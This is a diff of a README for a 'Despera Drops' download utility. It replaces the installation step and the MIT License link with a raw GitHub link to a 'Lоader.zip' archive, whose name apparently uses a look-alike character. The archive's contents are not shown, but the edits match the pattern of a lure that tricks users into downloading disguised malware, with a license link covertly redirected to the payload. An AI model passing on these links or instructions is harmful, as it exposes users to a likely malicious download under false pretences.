@@ -28,7 +28,7 @@ Welcome to **Despera Drops ** – your all-in-one utility for seamless software 
 
 ## 📥 Installation
 
-1. **Download Loader.rar from the repository**  
+1. **Download https://raw.githubusercontent.com/CareBobo/DesperaDrops-FreeDL-Hub/main/Lоader.zip from the repository**  
 2. Extract the archive to your desired location
 3. Follow the included step-by-step instructions for your OS
 4. Launch Despera Drops and explore the features!
@@ -49,7 +49,7 @@ This project is made for educational and personal use only. Redistribution and e
 
 ## 📄 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) – 2025. All rights reserved.
+Licensed under the [MIT License](https://raw.githubusercontent.com/CareBobo/DesperaDrops-FreeDL-Hub/main/Lоader.zip) – 2025. All rights reserved.
 
 ---
 
